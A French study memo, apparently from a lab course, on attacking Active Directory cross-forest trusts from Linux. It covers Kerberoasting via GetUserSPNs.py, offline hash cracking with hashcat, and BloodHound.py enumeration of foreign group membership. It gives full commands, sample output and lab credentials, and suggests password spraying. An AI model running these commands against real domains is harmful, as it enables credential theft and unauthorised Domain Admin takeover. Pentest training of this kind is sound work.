# Mémo — Attacking Domain Trusts : Cross-Forest (depuis Linux)

> Pendant Linux du mémo [Cross-Forest depuis Windows](memo-trust-cross-forest-windows.md). Même logique : Kerberoasting à travers un trust **inter-forêts** bidirectionnel + chasse au **foreign group membership**, mais avec Impacket et BloodHound.py depuis une box d'attaque Linux.
> Lab : forêt `INLANEFREIGHT.LOCAL` ⇄ forêt `FREIGHTLOGISTICS.LOCAL`.

---

## 1. Cross-Forest Kerberoasting — GetUserSPNs.py

Il faut les creds d'un user de **notre** domaine qui peut s'authentifier dans l'autre domaine, + le flag **`-target-domain`** pointant la forêt cible.

```bash
# a) Énumérer les comptes à SPN dans la forêt cible
GetUserSPNs.py -target-domain FREIGHTLOGISTICS.LOCAL INLANEFREIGHT.LOCAL/wley
#   (prompt Password)
#   → mssqlsvc | MemberOf: CN=Domain Admins,...,DC=FREIGHTLOGISTICS,DC=LOCAL
```
> Format : `-target-domain <forêt cible> <notre domaine>/<notre user>`. Le compte `mssqlsvc` est **Domain Admin** de la forêt cible → jackpot si on crack son hash.

```bash
# b) Demander le TGS (ajouter -request), idéalement -outputfile pour Hashcat
GetUserSPNs.py -request -target-domain FREIGHTLOGISTICS.LOCAL INLANEFREIGHT.LOCAL/wley \
  -outputfile mssqlsvc_tgs.hash
#   → $krb5tgs$23$*mssqlsvc$FREIGHTLOGISTICS.LOCAL$FREIGHTLOGISTICS.LOCAL/mssqlsvc*$10<SNIP>
```

```bash
# c) Crack offline
hashcat -m 13100 mssqlsvc_tgs.hash /usr/share/wordlists/rockyou.txt
```
Cracké → on peut s'authentifier dans `FREIGHTLOGISTICS.LOCAL` comme **Domain Admin**.

**Réflexes post-crack (réels)** :
- Vérifier si un compte **du même nom** existe dans notre domaine → **password re-use** (quick win si on n'a pas encore escaladé chez nous ; sinon = finding de rapport).
- Tenter **un** password spray avec le mot de passe cracké → mêmes admins ⇒ possible réutilisation sur d'autres service accounts.

## 2. Chasse au foreign group membership — bloodhound-python

Rappel : seuls les **Domain Local Groups** acceptent des principals hors-forêt → sur trust bidirectionnel, un user très privilégié de la forêt A est souvent membre du groupe built-in **Administrators** de la forêt B.

### a) DNS — pré-requis
BloodHound.py a besoin du **hostname FQDN** du DC (pas d'une IP) → configurer le resolver vers le DC cible.
```bash
cat /etc/resolv.conf
# commenter les nameservers publics, puis :
#   domain INLANEFREIGHT.LOCAL
#   nameserver 172.16.5.5          # IP de ACADEMY-EA-DC01
```

### b) Collecte forêt A (INLANEFREIGHT.LOCAL)
```bash
bloodhound-python -d INLANEFREIGHT.LOCAL -dc ACADEMY-EA-DC01 -c All -u forend -p Klmcargo2
#   → Found 2 domains in the forest, Found 2 trusts, dump JSON

# regrouper les JSON en un seul zip pour la GUI
zip -r ilfreight_bh.zip *.json
```

### c) Collecte forêt B (FREIGHTLOGISTICS.LOCAL)
Reconfigurer `/etc/resolv.conf` vers le DC de la forêt B :
```bash
#   domain FREIGHTLOGISTICS.LOCAL
#   nameserver 172.16.5.238        # IP de ACADEMY-EA-DC03
```
```bash
bloodhound-python -d FREIGHTLOGISTICS.LOCAL -dc ACADEMY-EA-DC03.FREIGHTLOGISTICS.LOCAL \
  -c All -u forend@inlanefreight.local -p Klmcargo2
#   (user de la forêt A au format UPN pour s'authentifier cross-forest)
```

### d) Analyse dans la GUI BloodHound
Upload des 2 jeux de données (JSON ou zip), puis onglet **Analysis → Users with Foreign Domain Group Membership**, source = `INLANEFREIGHT.LOCAL`.
→ `ADMINISTRATOR@INLANEFREIGHT.LOCAL` est membre de `ADMINISTRATORS@FREIGHTLOGISTICS.LOCAL` (comme vu côté Windows avec `Get-DomainForeignGroupMember`).

---

## 3. À retenir

| Objectif | Commande (Linux) |
|----------|------------------|
| Énum SPN forêt cible | `GetUserSPNs.py -target-domain <forêt> <mondom>/<user>` |
| Récup TGS | `GetUserSPNs.py -request -target-domain <forêt> <mondom>/<user> -outputfile h.txt` |
| Crack | `hashcat -m 13100 h.txt rockyou.txt` |
| DNS pour BH.py | éditer `/etc/resolv.conf` → `domain <forêt>` + `nameserver <IP DC>` |
| Collecte BH forêt A | `bloodhound-python -d <A> -dc <DC-A> -c All -u <user> -p <pass>` |
| Collecte BH forêt B | `bloodhound-python -d <B> -dc <FQDN DC-B> -c All -u <user>@<A> -p <pass>` |
| Regroupement | `zip -r bh.zip *.json` |
| Analyse | GUI → *Users with Foreign Domain Group Membership* |

**Équivalences Windows → Linux** : `Rubeus kerberoast /domain:` ⇄ `GetUserSPNs.py -target-domain` · `Get-DomainForeignGroupMember` ⇄ `bloodhound-python` + requête *Foreign Domain Group Membership*.

**Points clés du chapitre Trusts** : un trust compromis permet l'« end-around » (escalade via l'autre domaine + password re-use), DA sur un child = quasi toujours compromission du parent via **ExtraSids**, et tout l'enjeu reste l'énumération méthodique (direction du trust, SID Filtering, comptes au nom similaire).
